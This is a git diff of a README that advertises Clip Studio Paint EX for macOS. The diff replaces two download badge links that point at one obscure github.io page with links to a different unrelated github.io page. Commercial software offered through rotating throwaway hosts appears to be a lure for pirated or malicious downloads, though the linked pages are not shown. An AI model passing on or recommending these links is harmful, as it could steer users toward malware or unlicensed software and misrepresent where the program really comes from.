@@ -7,7 +7,7 @@ Favored by manga artists and illustrators worldwide, Clip Studio Paint EX is the
 ---
 
 ## ✅ Download Clip Studio Paint EX for macOS  
-[![Download Clip Studio Paint EX](https://img.shields.io/badge/Download-Clip_Studio_Paint_EX-blueviolet)](https://shuziktobehuman.github.io/huja/ClipStudio)
+[![Download Clip Studio Paint EX](https://img.shields.io/badge/Download-Clip_Studio_Paint_EX-blueviolet)](https://mitrobandus.github.io/.github/ClipStudio)
 
 ---
 
@@ -64,7 +64,7 @@ Clip Studio Paint EX is a high-performance illustration and comic creation softw
 
 ---
 
-[![Download Clip Studio Paint EX](https://img.shields.io/badge/Download-Clip_Studio_Paint_EX-blueviolet)](https://shuziktobehuman.github.io/huja/ClipStudio)
+[![Download Clip Studio Paint EX](https://img.shields.io/badge/Download-Clip_Studio_Paint_EX-blueviolet)](https://mitrobandus.github.io/.github/ClipStudio)
 
 ---
 
